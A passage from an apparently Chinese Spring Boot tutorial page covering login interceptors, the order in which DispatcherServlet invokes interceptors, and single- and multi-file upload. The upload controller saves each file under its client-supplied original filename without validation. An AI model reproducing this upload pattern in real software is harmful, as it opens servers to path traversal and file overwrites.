session.getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>);<br><br>        <span class="hljs-keyword">if</span>(loginUser != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">//放行</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//拦截住。未登录。跳转到登录页</span><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;请先登录&quot;</span>);<br><span class="hljs-comment">//        re.sendRedirect(&quot;/&quot;);</span><br>        request.getRequestDispatcher(<span class="hljs-string">&quot;/&quot;</span>).forward(request,response);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 目标方法执行完成以后</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        log.info(<span class="hljs-string">&quot;postHandle执行&#123;&#125;&quot;</span>,modelAndView);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 页面渲染以后</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        log.info(<span class="hljs-string">&quot;afterCompletion执行异常&#123;&#125;&quot;</span>,ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>拦截器注册到容器中 &amp;&amp; 指定拦截规则：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<span class="hljs-comment">//拦截器注册到容器中</span><br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">//所有请求都被拦截包括静态资源</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-string">&quot;/css/**&quot;</span>,<span class="hljs-string">&quot;/fonts/**&quot;</span>,<span class="hljs-string">&quot;/images/**&quot;</span>,<br>                        <span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/aa/**&quot;</span>); <span class="hljs-comment">//放行的请求</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="49、拦截器-【源码分析】-拦截器的执行时机和原理"><a href="#49、拦截器-【源码分析】-拦截器的执行时机和原理" class="headerlink" title="49、拦截器-【源码分析】-拦截器的执行时机和原理"></a>49、拦截器-【源码分析】-拦截器的执行时机和原理</h2><ol><li>根据当前请求，找到<code>HandlerExecutionChain</code>（可以处理请求的handler以及handler的所有 拦截器）</li><li>先来顺序执行 所有拦截器的 <code>preHandle()</code>方法。<ul><li>如果当前拦截器<code>preHandle()</code>返回为<code>true</code>。则执行下一个拦截器的<code>preHandle()</code></li><li>如果当前拦截器返回为<code>false</code>。直接倒序执行所有已经执行了的拦截器的  <code>afterCompletion();</code>。</li></ul></li><li>如果任何一个拦截器返回<code>false</code>，直接跳出不执行目标方法。</li><li>所有拦截器都返回<code>true</code>，才执行目标方法。</li><li>倒序执行所有拦截器的<code>postHandle()</code>方法。</li><li>前面的步骤有任何异常都会直接倒序触发 <code>afterCompletion()</code>。</li><li>页面成功渲染完成以后，也会倒序触发 <code>afterCompletion()</code>。</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211315633.png" alt="在这里插入图片描述"></p><p><code>DispatcherServlet</code>中涉及到<code>HandlerInterceptor</code>的地方：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            ...<br>            <br>                <span class="hljs-comment">//该方法内调用HandlerInterceptor的preHandle()</span><br><span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            ...<br>                <span class="hljs-comment">//该方法内调用HandlerInterceptor的postHandle()</span><br>mappedHandler.applyPostHandle(processedRequest, response, mv);<br>&#125;<br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            <span class="hljs-comment">//该方法内调用HandlerInterceptor接口的afterCompletion方法</span><br>triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            <span class="hljs-comment">//该方法内调用HandlerInterceptor接口的afterCompletion方法</span><br>triggerAfterCompletion(processedRequest, response, mappedHandler,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerAfterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//该方法内调用HandlerInterceptor接口的afterCompletion方法</span><br>mappedHandler.triggerAfterCompletion(request, response, ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//该方法内调用HandlerInterceptor接口的afterCompletion方法</span><br><span class="hljs-comment">// Exception (if any) is already handled..</span><br>mappedHandler.triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br>&#125;<br>&#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerExecutionChain</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-type">boolean</span> <span class="hljs-title function_">applyPreHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.interceptorList.size(); i++) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br>            <span class="hljs-comment">//HandlerInterceptor的preHandle方法</span><br><span class="hljs-keyword">if</span> (!interceptor.preHandle(request, response, <span class="hljs-built_in">this</span>.handler)) &#123;<br>                <br>triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-built_in">this</span>.interceptorIndex = i;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">applyPostHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, <span class="hljs-meta">@Nullable</span> ModelAndView mv)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br>            <br>            <span class="hljs-comment">//HandlerInterceptor接口的postHandle方法</span><br>interceptor.postHandle(request, response, <span class="hljs-built_in">this</span>.handler, mv);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerAfterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, <span class="hljs-meta">@Nullable</span> Exception ex)</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorIndex; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//HandlerInterceptor接口的afterCompletion方法</span><br>interceptor.afterCompletion(request, response, <span class="hljs-built_in">this</span>.handler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex2) &#123;<br>logger.error(<span class="hljs-string">&quot;HandlerInterceptor.afterCompletion threw exception&quot;</span>, ex2);<br>&#125;<br>&#125;<br>&#125;<br>    <br>    <br>&#125; <br>    <br></code></pre></td></tr></table></figure><h2 id="50、文件上传-单文件与多文件上传的使用"><a href="#50、文件上传-单文件与多文件上传的使用" class="headerlink" title="50、文件上传-单文件与多文件上传的使用"></a>50、文件上传-单文件与多文件上传的使用</h2><ul><li>页面代码<code>/static/form/form_layouts.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;form&quot;</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/upload&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;</span>邮箱<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter email&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;</span>名字<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span>头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;headerImg&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span>生活照<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;photos&quot;</span> <span class="hljs-attr">multiple</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span> Check me out<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>控制层代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormTestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/form_layouts&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">form_layouts</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form/form_layouts&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;email&quot;)</span> String email,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestPart(&quot;headerImg&quot;)</span> MultipartFile headerImg,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestPart(&quot;photos&quot;)</span> MultipartFile[] photos)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        log.info(<span class="hljs-string">&quot;上传的信息：email=&#123;&#125;，username=&#123;&#125;，headerImg=&#123;&#125;，photos=&#123;&#125;&quot;</span>,<br>                 email,username,headerImg.getSize(),photos.length);<br><br>        <span class="hljs-keyword">if</span>(!headerImg.isEmpty())&#123;<br>            <span class="hljs-comment">//保存到文件服务器，OSS服务器</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> headerImg.getOriginalFilename();<br>            headerImg.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;H:\\cache\\&quot;</span>+originalFilename));<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(photos.length &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">for</span> (MultipartFile photo : photos) &#123;<br>                <span class="hljs-keyword">if</span>(!photo.isEmpty())&#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> photo.getOriginalFilename();<br>                    photo.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;H:\\cache\\&quot;</span>+originalFilename));<br>                &#125;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件上传相关的配置类：</p><ul><li><code>org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration</code></li><li><code>org.springframework.boot.autoconfigure.web.servlet.MultipartProperties</code></li></ul><p>文件大小相关配置项：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.servlet.multipart.max-file-size</span>=<span class="hljs-string">10MB</span><br><span class="hljs-attr">spring.servlet.multipart.max-request-size</span>=<span class="hljs-string">100MB</span><br></code></pre></td></tr></table></figure><h2 id="51、文件上传-【源码流程】文件上传参数解析器"><a href="#51、文件上传-【源码流程】文件上传参数解析器" class="headerlink" title="51、文件上传-【源码流程】文件上传参数解析器"></a>51、文件上传-【源码流程】文件上传参数解析器</h2><p>文件上传相关的自动配置类<code>MultipartAutoConfiguration</code>有创建文件上传参数解析器<code>StandardServletMultipartResolver</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, StandardServletMultipartResolver.class, MultipartConfigElement.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;spring.servlet.multipart&quot;, name = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@EnableConfigurationProperties(MultipartProperties.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultipartAutoConfiguration</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MultipartProperties multipartProperties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">MultipartAutoConfiguration</span><span class="hljs-params">(MultipartProperties multipartProperties)</span> &#123;<br><span class="hljs-built_in">this</span>.multipartProperties = multipartProperties;<br>&#125;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnMissingBean(&#123; MultipartConfigElement.class, CommonsMultipartResolver.class &#125;)</span><br><span class="hljs-keyword">public</span> MultipartConfigElement <span class="hljs-title function_">multipartConfigElement</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.multipartProperties.createMultipartConfig();<br>&#125;<br><br><span class="hljs-meta">@Bean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(MultipartResolver.class)</span><br><span class="hljs-keyword">public</span> StandardServletMultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//配置好文件上传解析器</span><br><span class="hljs-type">StandardServletMultipartResolver</span> <span class="hljs-variable">multipartResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardServletMultipartResolver</span>();<br>multipartResolver.setResolveLazily(<span class="hljs-built_in">this</span>.multipartProperties.isResolveLazily());<br><span class="hljs-keyword">return</span> multipartResolver;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传解析器</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StandardServletMultipartResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultipartResolver</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">resolveLazily</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setResolveLazily</span><span class="hljs-params">(<span class="hljs-type">boolean</span> resolveLazily)</span> &#123;<br><span class="hljs-built_in">this</span>.resolveLazily = resolveLazily;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span 